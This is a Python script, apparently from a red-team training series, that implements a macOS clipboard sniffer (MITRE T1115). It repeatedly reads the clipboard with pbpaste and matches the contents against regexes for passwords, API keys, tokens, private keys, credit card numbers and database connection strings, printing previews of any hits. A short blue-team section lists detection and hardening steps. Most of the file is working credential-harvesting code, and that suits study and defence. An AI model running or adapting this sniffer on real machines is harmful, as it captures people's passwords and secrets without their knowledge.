#!/usr/bin/env python3
"""
Clipboard Sniffer — The Eden's Sins Phase 5
MITRE ATT&CK: T1115 Clipboard Data

Monitors macOS clipboard for sensitive data (passwords, tokens, etc).

Usage:
    python3 clipboard_sniff.py --duration 60 --interval 2
    python3 clipboard_sniff.py --detect
"""

import argparse, os, re, subprocess, sys, time
from datetime import datetime


SENSITIVE_PATTERNS = {
    "password": re.compile(r"(?i)(password|passwd|pwd)\s*[:=]\s*\S+"),
    "api_key": re.compile(r"(?i)(api[_-]?key|apikey)\s*[:=]\s*\S+"),
    "bearer_token": re.compile(r"Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+"),
    "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "private_key": re.compile(r"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----"),
    "jwt": re.compile(r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+"),
    "credit_card": re.compile(r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b"),
    "ssh_key": re.compile(r"ssh-(rsa|ed25519|ecdsa)\s+[A-Za-z0-9+/]+"),
    "connection_string": re.compile(r"(?i)(mysql|postgres|mongodb)://\S+"),
}


def get_clipboard():
    try:
        p = subprocess.run(["pbpaste"], capture_output=True, text=True, timeout=5)
        return p.stdout if p.returncode == 0 else ""
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return ""


def check_sensitive(text):
    findings = []
    for name, pattern in SENSITIVE_PATTERNS.items():
        if pattern.search(text):
            findings.append(name)
    return findings


def monitor(duration=60, interval=2):
    print("╔════════════════════════════════════════════╗")
    print("║  THE EDEN'S SINS — Clipboard Sniffer     ║")
    print("║  MITRE: T1115 Clipboard Data                ║")
    print("╚════════════════════════════════════════════╝")
    print(f"\n[*] Monitoring clipboard for {duration}s (interval: {interval}s)")
    print("[*] Looking for: passwords, API keys, tokens, PII\n")

    last_content = ""
    changes = 0
    sensitive_found = 0
    end_time = time.time() + duration

    while time.time() < end_time:
        content = get_clipboard()
        if content and content != last_content:
            changes += 1
            ts = datetime.now().strftime("%H:%M:%S")
            preview = content[:60].replace("\n", "\\n")

            findings = check_sensitive(content)
            if findings:
                sensitive_found += 1
                print(f"  🔴 [{ts}] SENSITIVE: {', '.join(findings)}")
                print(f"       Preview: {preview}...")
            else:
                print(f"  📋 [{ts}] Change #{changes}: {preview}...")

            last_content = content
        time.sleep(interval)

    print(f"\n[+] Monitor complete: {changes} changes, {sensitive_found} sensitive")


def detect_guide():
    print("""
  BLUE TEAM — Clipboard Monitoring Detection
  ═══════════════════════════════════════════
  Detection:
    • Monitor repeated pbpaste/pbcopy command execution
    • ESF: track NSPasteboard access via Endpoint Security
    • On Sonoma+: apps need TCC permission for clipboard (CGPreflightScreenCaptureAccess)
    • Log analysis: processes accessing NSPasteboard frequently

  Hardening:
    • Use clipboard timeout managers (auto-clear after 30s)
    • Password managers: auto-clear clipboard after paste
    • TCC: restrict clipboard access on Sonoma+
    • 1Password/Bitwarden: use browser integration instead of clipboard
    • Awareness: don't copy sensitive data to clipboard
    """)


def main():
    p = argparse.ArgumentParser(description="Clipboard Sniffer — The Eden's Sins")
    p.add_argument("--duration", type=int, default=60)
    p.add_argument("--interval", type=float, default=2.0)
    p.add_argument("--detect", action="store_true")
    args = p.parse_args()

    if args.detect:
        detect_guide()
    else:
        if os.uname().sysname != "Darwin":
            print("[!] Not macOS — clipboard sniffer needs pbpaste")
            print("[*] On macOS: python3 clipboard_sniff.py --duration 60")
            return
        monitor(args.duration, args.interval)


if __name__ == "__main__":
    main()
